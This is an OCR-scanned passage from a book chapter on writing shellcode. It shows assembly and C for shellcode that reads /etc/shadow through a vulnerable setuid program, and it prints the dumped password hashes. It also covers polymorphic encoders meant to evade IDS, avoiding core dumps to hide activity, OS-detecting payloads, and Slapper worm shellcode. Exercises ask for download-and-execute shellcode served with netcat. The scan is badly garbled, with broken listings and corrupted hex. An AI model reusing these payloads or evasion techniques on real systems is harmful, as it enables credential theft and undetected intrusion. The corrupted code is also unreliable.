the program are the following: 
read(<descriptor returned by open>,<pointer to small>,<size of small) ; 
write(<stdout>, ^pointer to smalls'H <size of smalls) ; 
The first challenge is the fact that in many programs file descriptor numbers are not 
static. In this case, we know the file descriptor returned by the open function will always 
be 4 because we're using a small program and because the program does not contain any 
functions about which we are not certain whether they will or will not open a file or 
socket before the overflow occurs. Unfortunately, in some cases you just don't know 
what the correct file descriptor is. In such cases, you can try all file descriptors until 
something good conies up. 
The second challenge is that we need a pointer to the "small" array.There are many 
merhods to get the location of this buffer. As we've detailed, you can use the strcpy and 
memser function to reference strings. Using the ltrace utility, as shown in Example 9.17, 
we can get more information about how these functions are eventually used by the 
program: 

Writing Shellcode II • Chapter 9 
399 
> Example 9.17 Using Itrace 
1 
Iroot@gabriel /tmpltt Itrace 
./readshadow aa 
2 
libc_start_main(0x08048610, 2, 0xbff£fb54. Ox080483eO, 0x080486bc <unfinished ...> 
3 
register_frame_info[0x08049700, 0x0B0497£4, 0xbfff£af8, 0x4004b0£7, 0x4004b0e0) = 
0x4O13c400 
4 open[•/etc/shadow-, 0, 010001130340) 
= 3 
5 getuidn 
= 0 
6 setuid(O) 
= 0 
7 getgidO 
= 0 
8 setgid(O) 
= 0 
9 
strcpy(OxbfffE9bO, "aa"] 
= 0xbffff9b0 
10 memset(0xbffff9b0, '\000', 254) 
- 0xbffff9b0 
1 1 read(3, "root:$15wpb5dGdg$Farrr9Ureecu¥£u" 
254) = 254 
12 
deregister_frame_in£o(0x08049700, 0. 0xb£fffae8, 0x08048676, 3) = 0x080497£4 
13 +++ exited (status 0) ++ + 
14 
[rootSgabriel /tmp]# 
Analysis 
In lines 9 and 10, you can see chat the pointer 0xbflR9bU is used to reference the "small'' 
string. We can use the same address in the system calls that we want to implement with 
our shellcode. 
Getting the address of the small array can also be done using GDB, as shown in 
Example 9.18. 
|>'»t»>* Example 9.18 Using GDB 
1 
[root@gabriel /tmp) ft gdb -q ./readshadow 
2 
(gdb) b strcpy 
3 Breakpoint 1 at 0x80484d0 
4 
(gdb) r aa 
5 Starting program: /tmp/./readshadow aa 
6 Breakpoint 1 at 0x4009cBaa: hie ../sysdeps/generic/strcpy.c, line 34. 
7 
8 
Breakpoint 1, strcpy (dest=0xb££f£9d0 "\001", src=0xb£fffc7b "aa") at 
. . /sysdeps/generic/strcpy.c;34 
9 
34 
. , /sysdeps/generic/strcpy.c: No such hie or directory. 
10 (gdb) 
Analysis 
First, we set a break point on the strcpy function using the GDB command b strcpy (see 
line 2). This will cause GDB to stop the execution flow of the program when the strcpy 
function is about to be executed. We run the program with the argument aa (line 4), 
and after a small amount of time strcpy is about to be executed and GDB suspends the 
program.This happens at lines 6 through H). GDB displays automatically some informa-
tion about the strcpy function. In this information, we can see " d est=n.\br}tf9d0". This is 
the location of the "small" string and is exactly the same address we found using Itrace. 
Now that we have the file descriptor and the memory address of the "small" array, 
we know that the system calls we would like to execute with our shellcode should look 
like the following: 

Chapter 9 • Writing Shelkode II 
read(4, 
Oxbffff9d0,254) ; 
writeCL, Oxbf f ff 9d0, 254) ; 
Example 9.19 shows the assembly implementation of the functions: 
Example 9.19 Assembly Implementation 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
BITS 
x o r 
m u l 
cdq 
mov 
mov 
mov 
mov 
i n t 
mov 
mov 
int 
32 
ebx,ebx 
e b x 
a l . 0x3 
b l . 0x4 
ecx,0xb££ff9d0 
d l , 2 5 4 
0x80 
a l , 0 x 4 
b l , 0 x 1 
0x80 
Analysis 
Because both the read and write system calls require three arguments, we first make sure 
that EBX, EAX, and EDX are clean. There is no need to clear the ECX register because 
we're using that register to store a four-byte value that is the pointer to the "small" array. 
After cleaning the registers, we put the read system call identifier in the AL register 
(line 7).Then the file descriptor from which we will read is put in the BL register,The 
pointer to the "small" array is put in ECX and the amount of bytes we'd like to read is 
put into the DL register. All arguments are ready so we can call the kernel to execute 
the system call. 
Now that the read system call reads 254 bytes from the shadow file descriptor, we 
can use the write system call to write the read data to stdout. First, we store the write 
system call identifier in the AL register. Because the arguments of the write call are sim-
ilar to the read system call, we only need to modify the content of the BL register. At 
line 14, we put the value !, which is the stdout file descriptor, in the BL register. Now 
all arguments are ready and we can call the kernel to execute the system call. When 
using the shellcode in an exploit for the given program, we get the following result: 
[guest@gabriel /tmp]S ,/expl.pl 
The new return address: Oxbffff8c0 
root$lSwpbSdGdg$Farrr9UreecuYfun6R0r5/:12202:0:99999:7: : : 
bin;';11439:0:99999:7::: 
daemon:*:11439:0:99999:7: :: 
adm;*:11439:0:99999:7::: 
lp:»:11439:0:99999:7::: 
syne:qW3seJ.er 11vo:114 3 9:0:99 9 99:7::: 
shutdown:*:11439:0:99999:7::: 
halt:*:11439:0:99999:7::: 
[guestegabriel /tmp]$ 

Writing Shellcode II • Chapter 9 
401 
Example 9.20 shows a system call trace of the program with the executed shellcode. 
1111111L Example 9.20 SysCall Trace 
1 7726 openC/etc/shadow", 0_RDONLYI 
- 4 
2 7726 gecuidl) 
=• 0 
3 7726 setuid(C) 
= 0 
4 7726 getgidO 
= 0 
5 772S setgid{0} 
= 0 
6 7726 readlO, "\n", 254) 
= 1 
7 7726 read(4, "root :$l$wpbSdGdg$Farrr9UreecuYfu" . , . , 254) = 254 
8 7726 writed, -root:$l$wpb5aGdg$Farrr9Ureecu¥fu".. ., 254) =254 
9 7726 
SIGSEGV (Segmentation fault) 
Analysis 
The two system calls we implemented in the shellcode are executed successfully at lines 
7 and 8. Unfortunately, at line 9 the program is terminated due to a segmentation fault. 
This happened because we didn't do an exit after the last system call and the system 
therefore continued to execute the data located behind our shellcode. 
Another problem exists in the shellcode. What if the shadow file is only 100 bytes in 
size?The read function won't have a problem with that.The read system call by default 
returns the amount of bytes read. So if we use the return value of the read system call as 
the third argument of the write system call and also add an exit to the code, the shell-
code always functions properly and won't cause the program to dump core. Dumping 
core, or more commonly referred to as a core dump, is when a system crashes and 
memory gets written to a specific location.This is shown in Example 9.21. 
S T N ^ R E S S 
Exampl' 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
BITS 
xor 
mill 
cdq 
mov 
wov 
mov 
mov 
i n t 
mov 
mov 
mov 
i n t 
dec 
mov 
i n t 
e 9.21 Core Dumps 
::: 
ebx,ebx 
ebx 
al,0x3 
bl,0x4 
eox,Oxbffff9dO 
dl,254 
0x60 
dl,al 
al,0x4 
1)1,0x1 
0x80 
b l 
a l , l 
0x80 

402 
Chapter 9 • Writing Shellcode II 
> x t > 
2 
3 
4 
5 
6 
7 
8 
9 
7782 
7782 
7782 
7782 
7782 
7782 
7782 
7732 
Analysis 
At Hue 14, we store the return value of the read system call in the DL register so it can 
be used as the third argument of the write system call. Then, after the write system call 
is executed, we do an exit(0) to terminate the program. Example 9.22 shows a trace of 
the new version of our read-write shellcode. 
Example 9.22 RW Shellcode 
1 
7782 
open("/etc/shadow", o_RD0NLY) 
= 4 
getuid() 
= 0 
setuid(O) 
= 0 
getgid() 
= 0 
setgid(O) 
= 0 
read(0, "\n", 254) 
= 1 
read(4, "root:Sl$wpbSdGdgSFarrr9UreecuYfun,.., 254) = 254 
write(1, -roQt:$l$wpb5dGdg$Farrr9UreecuYfu-..., 254) = 254 
_exit(0) 
The read and write system Look exactly the same as in Example 9.20, but we know 
that the value 254 that is used in the write system call (line 8) is based on the value 
returned by the read system call at line 254. In addition to this, the program does a nice 
exit, and doesn't dump core anymore.This is really important because programs that 
dump core make log file entries that may reveal your activity. 
Encoding Shellcode 
Shellcode encoding has been gaining popularity In this technique, the exploit encodes 
the shellcode and places a decoder in front of the shellcode. Once executed, the decoder 
decodes the shellcode and jumps to it, 
When the exploit encodes your shellcode with a different value, every time it is exe-
cuted and uses a decoder that is created on-the-fly, your payload becomes polymorphic 
and almost no IDS will be able to detect it. Some IDS plug-ins have the capability to 
decode encoded shellcode; however, they are very CPU-intensive and definitely not 
widely deployed on the Internet. 
Let's say your exploit encodes your shellcode by creating a random number and 
adding it to every byte in the shellcode.The encoding would look like the following in C: 
int number = get_random_number () ; 
for(count = 0;count < strlen(shellcode); count++) { 
shellcode[count] +~ number; 
} 
The decoder, which has to be written in assembly, needs to subtract the random 
number of every byte in the shellcode before it can jump to the code to have it exe-
cuted. The decoder will therefore have to look like the following: 
for (count • 0;count < strlentfshellcode) ; count •*•+) { 
shellcode[count] -= number; 
) 
Example 9.23 shows the decoder implemented in assembly. 

Writing Sheilcode II • Chapter 9 
403 
Example 9.23 Decoder Implementation 
1 
BITS 32 
2 
3 
jmp short go 
4 
next: 
5 
6 
pop 
7 
xor 
o 
mov 
9 
change: 
10 
sub byte 
11 
dec 
12 
jriz change 
13 
jmp short ok 
14 
go: 
15 
c a l l next 
16 
Ok: 
e s i 
ecx,ecx 
cl,0 
[esi + ecx - 1 ] ,0 
c l 
Analysis 
The 0 at line S has to be replaced by the exploit at runtime and should represent the 
length of the encoded sheilcode. The 0 at line 10 also has to be filled in by the exploit at 
runtime and should represent the random value that was used to encode the sheilcode. 
We'll discuss later how this can be done. 
The ok: label at line 16 is used to reference the encoded (at a later stage decoded) 
sheilcode. We can do this because the decoder is to be placed exactly in front of the 
sheilcode, like in the following: 
[DECODER][ENCODED SHELLCODE] 
The decoder uses the jmp/call technique to get a pointer to the sheilcode in the 
ESI register. Using this pointer, the sheilcode can be manipulated byte by byte until it is 
entirely decoded.The decoding happens in a loop called "change". Before the loop 
starts, we store the length of the sheilcode in the CL register (line tt). Every time the 
loop cycles, the value in CL is decreased by one (line 11). When CL becomes zero, the 
JNZ instruction (Jump if Not Zero) is no longer executed, "with the result being that 
the loop finishes. Within the loop, we subtract the byte used to encode the sheilcode 
from the byte located at offset ECX - 1 from the sheilcode pointer in ESL Because 
ECX contains the string size and is decreased by one every cycle of the loop, every byte 
of the sheilcode is decoded. 
Once the sheilcode is decoded, the "jmp short ok" instruction is executed.The 
decoded sheilcode is at the location ok: and the jump will cause that sheilcode to be 
executed. 
If we compile the decoder and convert it into hexadecimal characters, it will look 
like this: 
char shellcode[J • 
"\xeb\xl0\x5e\x31\xc9\xbl\>[00\x80\x6c\x0e\xff\ji00\xfe\xc9\x75" 
•\xf7\xeb\x0S\xe8\xeb\xf f:\xff\xff; 

404 
Chapter 9 • Writing Shellcode II 
Remember that the first NULL byte has to be replaced by the exploit with the 
length of the encoded shellcode, while the second NULL byte needs to be replaced 
with the value that was used to encode the shellcode, 
The C program in Example 'J.24 will encode the Linux execve /bin/sh shellcode 
example that was given. It will then modify the decoder by adding the size of the 
encoded shellcode and the value used to encode all bytes.The program then places the 
decoder in front of the shellcode, prints the result to stdout, and executes the encoded 
shellcode. 
Example 9.24 Decoder Implementation Program 
1 
#include <:sys/time,h:> 
2 
if include <;stdlib.h? 
3 
#include <unistd.h> 
4 
5 int getnumber(int quo) 
6 j 
7 
int seed; 
8 
struct timeval tnu 
9 
gettimeofday( ttm, NULL }; 
10 
seed = tm. tv_sec + tm.tv_usec; 
11 
srandomf seed 
}; 
12 
return {random() % quo) ; 
13 ) 
14 
15 
void execute{char *data) 
16 ! 
17 
int *ret; 
18 
ret = (int M&ret + 2; 
19 
(*ret) = (intJdata; 
20 
i 
21 
22 
void print_code{char *data) 
[ 
23 
24 
int i , l = 15; 
25 
printf ("\n\nchar code [ ] = \n*) ; 
26 
27 
for (i = 0; i < strlen(data); +-t-i) [ 
28 
if (1 s= 15) { 
29 
if (i) 
30 
print£("\"\n"); 
31 
printf("\t\"-); 
32 
1 = 0; 
33 
j 
34 
+ + 1 ; 
35 
print£(-\\x%02x-, ((unsigned char *)data)[i]); 
36 ) 
37 
printf("\";\n\n\n"); 
38 } 
39 
40 int main!) { 
41 
42 
char shellcodet] = 
43 
"\x31\xc0\x99\x52\x68\x2f\x2f\x73\x68\x68\x2£\x62\x69\x6e\x89-
44 
"\xe3\x50\x53\xE9\xel\xb0Yx0b\xcd\x80"; 

Writing Shellcode II • Chapter 9 
405 
45 
46 
char decoder[] = 
47 
"\xeb\xlQ\xSe\x31\xc9\xbl\xO0\x80\x6c\x0e\xff\x00\xfe\xc9\x75'' 
48 
"\xf7\xeb\x05\xeS\xeb\xff\xff\xff"; 
49 
50 
int count; 
51 
int number = getnumber(200) ; 
52 
int nullbyte = 0; 
53 
int ldecoder j 
54 
int lshellcode • strlerUshellcode); 
char *result; 
56 
57 
printf("Using the value: %d to encode the shellcode\n",number!; 
58 
59 
decoder[€) += lshellcode; 
60 
decoder[11] += number; 
61 
62 
ldecoder = strlen(decoder); 
63 
64 
do { 
65 
i£(nullbyte == 1) { 
66 
number • getnumber (10) ; 
67 
decoder[11] += number; 
68 
nullbyte = 0; 
69 
} 
70 
for(count=0; count <• lshellcode; count++) { 
71 
shellcode[count] += number; 
72 
if(shellcode[count] == '\0'1 { 
73 
nullbyte = 1; 
74 
} 
75 
) 
76 
} whilefnullhyte == 1); 
77 
78 
result = malloc(lshellcode + ldecoder); 
79 
strcpy(result,decoder); 
80 
streat(result,shellcode}; 
81 
print_code(result); 
82 
execute(result); 
83 > 
Analysis 
We'll explain the program by looking at the main function because that's where all the 
action is. First, we initialize some important variables.The number variable is initialized 
with a random number lower then 200 at line 51 .This number will be used to encode 
every byte in the shellcode. 
In lines 53 and 54, we declare two integer variables that will hold the sizes of the 
decoder and the shellcode.The shellcode length variable lshellcode is initialized immedi-
ately, while the decoder length variable ldecoder is initialized a bit later in the code 
when it no longer contains NULL bytes.The strlen function returns the amount of 
bytes that exist in a string until the first NULL byte. Because we have two NULL bytes 
as placeholders in the decoder, we need to wait before requesting the length of the 
decoder array until these placeholders have been modified. 

406 
Chapter 9 • Writing Shellcode II 
The modification of the decoder happens at line 59 and 60. First, we put the length 
of the shellcode at decoder[6] and then put the value we're going to encode the shell-
code with at decode[ 11]. 
The encoding of the shellcode happens within the two loops at lines 64 through 76. 
The for loop at lines 70 through 75 does the actual encoding by taking every byte 
in the shellcode array and adding the value in the number variable to it. Within this for 
loop (at line 72), we verify whether the changed byte has become a NULL byte. If this 
is the case, the uullhyte variable is set to one. 
After the entire string has been encoded, we start over if a NULL byte was detected 
(line 76). Every time a NULL byte is detected, a second number is generated at line 66, 
the decoder is updated at line 67, the millbyte variable is set to 0 (line 68) and the 
encoding for loop starts again. 
After the shellcode has been encoded successfully, an array with the length of the 
decoder and shellcode arrays is allocated at line 78. 
We then copy the decoder and shellcode in this array and can now use the array in 
an exploit. First, we'll print the array to stdout at line 81.This allows us to see that the 
array is different every time the program is executed. After printing the array, we execute 
it in order to test the decoder. 
When the program in Example 9.24 is executed three rimes, we get the result 
shown in Example 9.25. 
" " ( • i n ' 
rmmmm Example 9.25 Results of Implementation Program 
[root@gabriel sub-decoderH ./encode 
Using the value: 152 to encode the shellcode 
char code!] = 
•\xeb\xl0\xSe\x31\xc9\xbl\xl8\xB0\x6c\x0e\icfI\x9c\xfa\xc9\x75" 
"\x£7\xab\x05\xe8\x.eb\x£f \xff\xff\xcd\x5c\x35\xee\x04\xcb\xcb" 
-\x0f\x04\x04\xcb\xfe\x05\x0a\x25\x7f\xec\xef\x25\x7d\x4c\xa7' 
"\x69\xlc"; 
sh-2.04# exit 
[rootegabriel sub-decoder] # . /encode 
Using the value: 104 to encode the shellcode 
char coded = 
-\Mb\xlO\xSH\x31\xc9\xbl\xia\x80\x6c\xOB\xff \x6a\xfH\xc9\x75" 
•,\xf7\xeb\x05\xee\xeb\xff \xfi\xff \x99\x23\x01\xba\xd0\x97\x97" 
"\xdb\xd0\xd0\x97\xca\xdl\xd6\xfl\x4b\xb8\xbb\xfl\x49\xl8\x73" 
•\x35\xe8"; 
sh-2.04# 

Writing Shellcode II • Chapter 9 
407 
Execution Analysis 
In bold is the execve shellcode that previously looked very7 different.There is no way 
that the encoded shellcode will still trigger IDS signatures for execve shellcode. 
Currently, the given encoder re-encodes the shellcode when it finds a NULL byte in the 
result,You can expand the program to also let it re-encode the shellcode when finding 
other characters such as newlines or slashes. 
There is one problem though.The encoder is pretty large and an IDS signature for 
it can be created pretty easily. The only workaround for that is to split the decoder into 
as many pieces as possible, rewrite all these pieces of code in many different ways and 
create a function that can give you a working decoder by randomly putting the little 
pieces together. 
For example, at line 11 of the decoder assembly code, we decrease the content of 
the CL register with one using the dec instruction. Instead of using dec, we could also 
use "sub 
cl,l" or "add 
cl, 111" followed by "sub cl, 110". The decoder can also be 
placed at the end of the shellcode. In that case, a jmp to the decoder will have to be 
placed in front of the shellcode and, of course, the decoder needs to be changed a bit, 
Besides splitting the decoder in many pieces, you can also write decoders that use dif-
ferent decoding algorithms. All these tricks combined will result in very stealthy exploits 
that contain shellcode that cannot be detected by modern IDSs. 
NOTES 
What can be very useful is shellcode that fetches a remote file and executes it. 
Write shellcode that makes a connection to a remote host, reads data from the 
host into a file, and then executes the file. The easiest way to serve the exe-
cutable is by running netcat on the remote host using these parameters: 
nc -I -p 6666 < executable 
Update the code from the second exercise so that it will work with an HTTP 
or FTP server. That way the exploit becomes very flexible and can download 
large files onto the system it is executed on. HTTP is probably going to be the 
easiest. Skip the headers and record the data after the \n\n. First write the code 
in Perl, then in C using system calls, and then make the assembly and shellcode. 
When making the assembly version, try to put the filename of the executable at 
the end of the code so it can be changed. 
Reusing Program Variables 
Sometimes a program allows you to store and execute only a very tiny shellcode. In such 
cases, you may want to reuse variables or strings that are declared in the program.This 
results in very small shellcode and increases the chance that your exploit will work. 
One major drawback of reusing program variables is that the exploit will only work 
with the same versions of the program that have been compiled with the same compiler. 

408 
Chapter 9 • Writing Shelkode II 
For example, an exploit reusing variables and written for a program on Red Hat Linux 
9.0 probably won't work for the same program on Red Hat 6.2. 
Open-Source Programs 
Finding the variables used in open-source programs is easy. Look in the source code for 
useful stuff such as user input and multidimensional array usage. If you find something, 
compile the program and find out where the data you want to reuse is mapped to in 
memory. Let's say we want to exploit an overflow in the following program: 
void abuse() { 
char command[}="/bin/sh"; 
printf("%s\nM
 hcommand}; 
) 
int maindnt argv.char **argc} { 
char buf[256] ; 
strcpy(buf, argc[1J); 
abuse f); 
} 
As you can see, the string /bin/sh is declared in the function abuse. This may look 
to you like an absurd example, but many programs have useful strings like this available 
for you. 
You need to find the location of the string in memory before you can use it. The 
location can be found using gdb, the GNU debugger, as shown in Example 9.26. 
W N ^ n n s Example 9.26 Locating Memory Blocks 
bash-.2 . Q5b$ gdb -q reusage 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
(no debugging symbols 
(gdb) 
d i s a s s e m b l e abus 
Dump of assembler code 
0x8048533 
0x8048539 
0x804853b 
0x304853e 
0x3043543 
0x8048543 
0x804854c 
0x804854f 
0x8043552 
0x3043555 
0x3043556 
0x804855b 
0x8048560 
0x8043563 
0x8043564 
0x8043565 
<abuser; 
-:abuse+l>: 
<abuse+3>: 
<abuse-t-6> : 
<abuse-t-ll>: 
<abuse+17>: 
<abuse4-20>; 
<abuse-t-23>; 
<abuse-t-26>: 
<abuse+29>: 
<abuse+30>: 
<abuae+35>: 
<abuse-»-40>: 
<abuse+43>: 
<abuse-t-44>: 
<abuse+45>: 
End of assembler dump. 
tgdb) 
x/U 
0x8048628 
0x3043633 
0x3048643 
0x804B628 
^_&ni+84s; 
<_fini + 100>: 
<_fini+116>: 
(gdb) 
bash-2.05b$ 
f o u n d } . . 
e 
.(gdb) 
for 
function a b u s e : 
push 
mov 
s u b 
mov 
mov 
mov 
mov 
s u b 
l e a 
push 
push 
c a l l 
a d d 
leave 
r e t 
l e a 
%ebp 
%espj %ebp 
S0x8,%esp 
0x304B623,%eax 
0x804362c,%edx 
%eax,0xf£ff££f8(%ebp) 
%edx,0xf££f£f£c(*ebp( 
$0x3,%esp 
Oxff£ff££8(%ebp),%eax 
%eax 
$0x8048630 
0x80483cc 
i p r i n t f > 
$0x10,%esp 
0x0(%esi),%esi 
0x6e69622£ 
0x00687325 
0x44534265 
0x7273203a 
0x33692f75 
0x6S2d3638 
0x000a7325 
0x696c2f63 
0x65724624 
0x73632f62 

Writing Shellcode II • Chapter 9 
409 
Analysis 
First, wc open the file in gdb (line 1) and disassemble the function abuse (line 3) because 
we know from the source that this function uses the /bin/sb string in a printf function. 
Using the x command (line 22), we check the memory addresses used by this function 
and find that the string is located at 0x8048628. 
Now that we have the memory address of the string, it is no longer necessary to put 
the string itself in our shellcode and that will make the shellcode much smaller. See for 
yourself what reusing the string does to our FreeBSD execve shellcode. 
BITS 32 
xor 
eax.eax 
push 
eax 
push 
eax 
push 
0x3043628 
push 
eax 
mov 
al, 59 
int 
80h 
We don't need to push the string //bin/sh on the stack and store its location in a 
register.This saves us about ten bytes, which can really make a difference in successfully 
exploiting a vulnerable program that allows you to store only a small amount of shell-
code. The resulting 14-byte shellcode for these instructions is shown in the following: 
char shellcode[] = 
•\xll\xcQ\x50\x50\x6S\x2B\x%6\xQt\xD8\x50\xbQ\xlb\xcti\x&Q*: 
Closed-Source Programs 
In the previous example, finding the string /bin/sh was easy because we knew it was 
referenced in the abuse function. So all we had to do was to look up this function's 
location and disassemble it in order to get the address. However, very often you don't 
know where in the program the variable is being used, so that other methods are needed 
to find the variable's location. 
Strings and other variables are often placed by the compiler in static locations that 
can be referenced any moment during the program's execution.The ELF executable 
format, which is the most common format on Linux and *BSD systems, stores program 
data in separate segments. Strings and other variables are often stored in the ".rodata" 
and ".data" segments. 
By using the readelf utility, you can easily get information on all the segments used 
in a binary.This information can be obtained using the -S switch, as in Example 9.27. 
_ _ Example 9.27 Ascertaining Information Using readelf 
bash-2-OSbS readelf -S reusage 
There are 22 section headers, starting at offset 0x3fc; 
Section Headers: 
[Hrl Name 
Type 
Addr 
Off 
Size 
ES Fig Lk Inf Al 
[ 0] 
NULL 
00000000 OOOOOO 000000 OO 
0 
0 
0 
[ 1] .interp 
PROGBITS 
OB0480f4 0000f4 000019 00 
A 0 
0 1 

410 
Chapter 9 • Writing Shelkode II 
[ 2] 
[ 3] 
[ 4] 
[ 5] 
[ 6] 
[ 7] 
[ 3] 
[ 9] 
[10] 
[11] 
[12] 
U3] 
[14] 
[15] 
[16] 
[17] 
[13] 
[19] 
[20] 
[21] 
.note.ABI-
.hash 
.dynsym 
.dynstr 
.rel.pit 
.init 
.pit 
.text 
.fini 
.rodata 
.data 
,eh_frame 
.dynamic 
. crors 
.dtors 
. jcr 
.got 
.loss 
. comment 
.shstrtab 
Key to Flags: 
•tag 
W (write), A (alloc), 
NOTE 
HASH 
DYTJSYM 
STRTAB 
REL 
PROGBITS 
PROGBITS 
PROGBITS 
PROGBITS 
PROGBITS 
PROGBITS 
PROGBITS 
DYNAMIC 
PROGBITS 
PROGBITS 
PROGBITS 
PROGBITS 
NOBITS 
PROGBITS 
STRTAB 
X (execute)r M 
I (info)r L (link order}, G (group), 
(extra OS processing required) o (OS 
08048110 000110 000013 00 
08048123 000128 000090 04 
080481D8 OOOlbS 000110 10 
080482C8 0002c8 0000b8 00 
08048380 000330 000020 08 
0E04B3a0 0003a0 00000b 00 
080483ac 0003ac 000050 04 
08048400 000400 0001d4 00 
030435d4 0005d4 000006 00 
0B0485da 0005da 0000a7 00 
08049684 000684 00000c 00 
08049690 000690 000004 00 
08049694 000694 000098 08 
0304972c 00072c 000008 00 
08049734 000734 000008 00 
0804973c 00073c 000004 00 
0E049740 000740 00001c 04 
0804975c 00075c 000020 00 
00000000 00075c 000107 00 
0O00000O 000863 000099 00 
(merge), S (strings) 
x (unxnown} 
specific), p (processor specific) 
;-. 
A 
A 
A 
A 
AX 
AX 
AX 
AX 
A 
KA 
HA 
KA 
MR 
WA 
HA 
HA 
WA 
•a 
4 
5 
0 
4 
0 
0 
0 
0 
0 
0 
0 
s 
0 
0 
0 
0 
a 
0 
0 
0 
0 
[ 
0 
* 
0 
0 
0 
0 
0 
0 
0 
0 
0 
0 
0 
0 
0 
0 
0 
• ; 
4 
4 
i 
•1 
.; 
4 
\r, 
4 
: 
• • ; 
•i 
t 
• ; 
• • ; 
• - , 
4 
• • ; 
i 
i 
Execution Analysis 
The output shown in Example 9.27 lists of all the segments in die program "reusage". As 
you can see, the .data segment (line 18) starts at memory address 0x()80485da and is 0xa7 
bytes large. To examine the content of this segment, you can use gdb with the x com-
mand. However, this is not recommended because . . . . Alternatively, the readelf program 
can be used to show the content of a segment and does so in both HEX and ASCII. 
Let's look at the content of the .data segment. In Example 9.27, yon can see readelf 
numbered all segments when we executed it with the -S flag. The .data segment is num-
bered 12. If we use this number combined with the -x switch, we can see this segment's 
content: 
bash-2. 05b$ readelf -x 12 reusage 
Hex dump of section '.data': 
0x08049684 
08049733 00000000 0E0485da 
8... 
bash-2.05bS 
The section contained no data except for a memory address (0x(}80485da) that 
appears to be a pointer to the ".rodata" segment. So let's have a look at that segment, 
shown in Example 9.28, to see if the string /bin/sh is located there. 
Example 9.28 Analyzing Memory 
1 
bash-2.05b$ readelf -x 11 reusage 
2 
Hex dump of section '.rodata't 
3 
0x080485da 6c2f6372 73203a44 53426565 72462400 ,$FreeBSD: src/1 
4 
0x030485ea 2f666c65 2d363833 692f7573 632f6269 ib/csu/i386-elf/ 
5 
OxOS0485fa 30303220 362e3120 762c532e 69747263 crti.S.v 1.6 200 
6 
0x0804860a 39343a39 313a3430 2035312f 35302f32 2/05/15 04:19:49 

Writing Shelkode II • Chapter 9 
411 
7 
0x0804861a 622f0024 20707845 206e6569 72626£20 
obrien Exp $./b 
8 
0x0804862a 42656572 4624000a 73250068 732f6e69 in/sh.%s..SFreeB 
9 
0x0804863a 2f757363 2f62696c 2f637273 203a4453 SD: src/lib/csu/ 
10 0x0804864a 2c532e6e 7472632f 666c6S2d 36383365 i386-elf/crtn.S, 
11 0x0304365a 35312f35 302f3230 30322035 2e312076 v 1.5 2002/05/15 
12 0x0804866a 6e656972 626f2039 343a3931 3a343020 04:19:49 obrien 
13 0x0804867a 
002420 70784520 Exp S. 
14 
bash-2.05b$ 
Analysis 
We found it! The string starts at the end of line 5 and ends on line 6. The exact location 
of the string can be calculated by using the memory at the beginning of line 5 
0x0804861a and by adding the numbers of bytes that we need to get to the string. This 
is the size of "obrien Exp $.", which is 14.The end result of the calculation is 
0x8048628.This is the same address we saw when we disassembled the abuse function. 
OS-Spanning Shelkode 
The main advantage of using shellcode that runs on multiple OSs is that you only have 
to use one shellcode array in your exploit so that payload, except for length and return 
addresses, will always be the same. The main disadvantage of multi-os shellcode is that 
you will always have to determine on what operating system your shellcode is executed. 
To find out whether your shellcode is executed on a BSD or Linux system is fairly 
easy. Just execute a system call that exists on both systems but that performs a completely 
different task and analyze the return value. In rhe case of Linux and FreeBSD, system call 
39 is interesting. In Linux, this system call stands for mkdir and on FreeBSD it stands for 
getppid. 
So in Linux, system call 39 can be used to create a directory.The system call requires 
several arguments including a pointer to a character array or the function will return an 
error. On FreeBSD, the syscall 39 can be used to get the parent process ID. This system 
call does not require an argument. By executing the following code on Linux and BSD, 
we can leverage an exploit or program on two different operating platforms.This is an 
extremely valuable technique when creating the most useful applications, 
xoi 
xoi 
mov 
iiiv 
The 
Linux 
FreeBSD 
eax, 
eax 
ebx H ebx 
a l , 3 9 
OxEO 
output is as folio 
: 
Error 
(-1) 
: A process ID 
An error is returned on Linux and a value on BSD. We can match on the error and 
use it to jump to the right. Example 9,29 presents a small piece of assembly code that 
shows how you can take advantage of this theory. 

412 
Chapter 9 • Writing Shellcode II 
l t N | , i l i Example 9.29 Assembly Creation 
1 
• • • • • i 
I xor 
, eax 
2 xor 
ebxH ebx 
3 mov 
al H 3 9 
4 
int 
0x30 
5 
6 
test 
eax,eax 
7 
js 
linux 
8 
9 
10 freebsd; 
11 
12 
; Add FreeBSD assembly 
13 
14 
15 linux; 
16 
17 ; Add Linux assembly 
Analysis 
In lines 1 through 4, we execute the system call 39 with no arguments on FreeBSD. 
Due to the calling convention of Linux, only the first argument of the mkdir func-
tion is set. As a result, it will, of course, fail. 
At line 7, we test whether the system call failed. If so, we jump to the Linux code; if 
not, we continue and execute the FreeBSD code. 
A very cool way of using this kind of shellcode would be to first determine the 
operating system and then read the appropriate shellcode from a network socket and 
execute it. 
For example, in the Linux or FreeBSD section, you could add code that prints a 
banner to the network socket.The exploit reads from the socket and, by using the 
banner, chooses what shellcode it will write on the socket.The shellcode then reads the 
code and jumps to it. This would be a great exercise for you, too! 
Understanding Existing Shellcode 
Now that you know how shellcode is developed, you will probably also want to learn 
how you can reverse engineer shellcode. We'll explain this by using the Slapper worm's 
shellcode as an example.This shellcode, which doesn't contain worm-specific code, was 
executed on many machines via a remote vulnerability in the openssl functionality that 
is used by the Apache mod_ssl module. 
In order to disassemble the shellcode, we cut and pasted it from the C source in a 
tiny Perl script and let the script write the shellcode in a file. The Perl script looks like 
the following: 
•••••••I " i usr/bin/perl 
$shellcode = 
"\x31\xdb\x89\xe7\x8d\x77\xl0". 

Writing Shellcode II • Chapters 
413 
"\x89\x77\x04\xBd\x4£\x20\x89". 
•\x4f\x08\xb3\xl0\x89\xl9\x31". 
"\3tc9\xbl\xff\x89\x0E\x51\x31". 
"\xc0\xb0\x66\xb3\x07\x89\xf9". 
•\xcd\xS0\x59\x31\xdb\x39\xd3". 
•\x75\x0a\x66\xb8\xl2\x34\x66". 
"\x39\x46\x02\x74\x02\xe2\xe0". 
•\x89\xcb\x31\xc9\xbl\x03\x31". 
-\xc0\xb0\x3f\x49\xcd\x80\x41". 
"\xe2\xf6". 
"\x31\xc9\xf7\xel\x51\x5b\xb0". 
"\xa4\xcdAx80". 
•\x31\xc0\x50\x68\x2f\x2f\x73". 
"\x68\x68\x2f\x62\x69\x6e\x89". 
"\xe3\x50\x53\xB9\xel\x99\xb0". 
